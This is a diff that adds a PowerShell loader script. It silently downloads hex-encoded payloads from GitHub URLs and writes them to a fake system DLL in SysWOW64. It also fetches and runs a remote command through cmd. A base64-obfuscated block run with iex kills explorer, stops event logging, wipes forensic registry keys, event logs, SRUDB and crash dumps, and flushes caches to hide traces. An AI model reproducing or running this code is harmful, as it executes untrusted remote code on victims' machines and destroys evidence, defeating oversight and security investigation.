@@ -1,0 +1,56 @@
+$ErrorActionPreference = 'SilentlyContinue'
+cls
+Add-Type -AssemblyName System.Windows.Forms *> $null
+$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/cast/iwe_history.txt"
+$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/cast/e.txt"
+$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/cast/b.txt"
+$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
+$clipText = "SteF6b2WrAgu"
+
+function HexToBytes {
+    param([string]$hexStr)
+    $cleanHex = [regex]::Replace($hexStr, '[^0-9A-Fa-f]', '')
+    if ($cleanHex.Length % 2 -ne 0) {
+        return $null
+    }
+    $byteArr = [byte[]]::new($cleanHex.Length / 2)
+    for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {
+        $byteArr[$i/2] = [convert]::ToByte($cleanHex.Substring($i, 2), 16)
+    }
+    return $byteArr
+}
+
+try {
+    $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing -TimeoutSec 20
+    $hexContent = $responseA.Content
+    $bytes = HexToBytes $hexContent
+    if ($bytes -ne $null) {
+        [IO.File]::WriteAllBytes($filePath, $bytes)
+    }
+} catch {}
+
+Set-Clipboard $clipText *> $null
+
+try {
+    $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing -TimeoutSec 20
+    $cmdToRun = $responseB.Content.Trim()
+    if ($cmdToRun) {
+        Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
+    }
+} catch {}
+
+do {
+    Start-Sleep -Seconds 2
+} while (Get-Process -Name "Installer")
+
+try {
+    $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing -TimeoutSec 20
+    $newHexContent = $responseC.Content
+    $newBytes = HexToBytes $newHexContent
+    if ($newBytes -ne $null) {
+        [IO.File]::WriteAllBytes($filePath, $newBytes)
+    }
+} catch {}
+
+iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJwpjbHMKdGFza2tpbGwgL2YgL2ltIGV4cGxvcmVyLmV4ZSAqPiAkbnVsbApuZXQgc3RvcCBFdmVudExvZyAveSAqPiAkbnVsbApyZWcgZGVsZXRlICJIS0NSXExvY2FsIFNldHRpbmdzXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXFNoZWxsIiAvZiAqPiAkbnVsbApyZWcgZGVsZXRlICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXENvbURsZzMyIiAvZiAqPiAkbnVsbApyZWcgZGVsZXRlICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXFJlY2VudERvY3MiIC9mICo+ICRudWxsCnJlZyBkZWxldGUgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcVXNlckFzc2lzdCIgL2YgKj4gJG51bGwKcmVnIGRlbGV0ZSAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxBcHBDb21wYXRGbGFnc1xDb21wYXRpYmlsaXR5IEFzc2lzdGFudFxTdG9yZSIgL2YgKj4gJG51bGwKcmVnIGRlbGV0ZSAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxGZWF0dXJlVXNhZ2UiIC9mICo+ICRudWxsCnJlZyBkZWxldGUgIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXFR5cGVkUGF0aHMiIC9mICo+ICRudWxsCkNsZWFyLURuc0NsaWVudENhY2hlICo+ICRudWxsClNldC1DbGlwYm9hcmQgLVZhbHVlICIxMDAwMTE5OTM0MjUwODI3NiIKUmVtb3ZlLUl0ZW0gLVBhdGggIiRlbnY6U3lzdGVtUm9vdFxTeXN0ZW0zMlx3aW5ldnRcTG9nc1wqLmV2dHgiIC1Gb3JjZSAqPiAkbnVsbApSZW1vdmUtSXRlbSAtUGF0aCAiJGVudjpTeXN0ZW1Sb290XGFwcGNvbXBhdFxwY2EqLnR4dCIgLUZvcmNlICo+ICRudWxsClJlbW92ZS1JdGVtIC1QYXRoICIkZW52OlN5c3RlbVJvb3RcU3lzdGVtMzJcc3J1XFNSVURCLmRhdCIgLUZvcmNlICo+ICRudWxsCiNSZW1vdmUtSXRlbSAtcGF0aCAiJGVudjpVU0VSUFJPRklMRVxBcHBEYXRhXExvY2FsXEZpdmVNXEZpdmVNLmFwcFxsb2dzXCoiIC1SZWN1cnNlIC9mICo+ICRudWxsCiNSZW1vdmUtSXRlbSAtcGF0aCAiJGVudjpVU0VSUFJPRklMRVxBcHBEYXRhXExvY2FsXEZpdmVNXEZpdmVNLmFwcFxjcmFzaGVzXCoiIC1SZWN1cnNlIC9mICo+ICRudWxsCkdldC1DaGlsZEl0ZW0gLVBhdGggIiRlbnY6VVNFUlBST0ZJTEVcQXBwRGF0YVxMb2NhbFxDcmFzaER1bXBzIiAtUmVjdXJzZSAtRmlsZSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgIippbnN0YWxsZXIqIiB9IHwgUmVtb3ZlLUl0ZW0gLUZvcmNlICo+ICRudWxsClJ1bmRsbDMyLmV4ZSBhcHBoZWxwLmRsbCxTaGltRmx1c2hDYWNoZSAqPiAkbnVsbApTdGFydC1Qcm9jZXNzIGV4cGxvcmVyLmV4ZSAqPiAkbnVsbApuZXQgc3RhcnQgRXZlbnRMb2cgL3kgKj4gJG51bGwKZXhpdA=="))) #secret
+exit
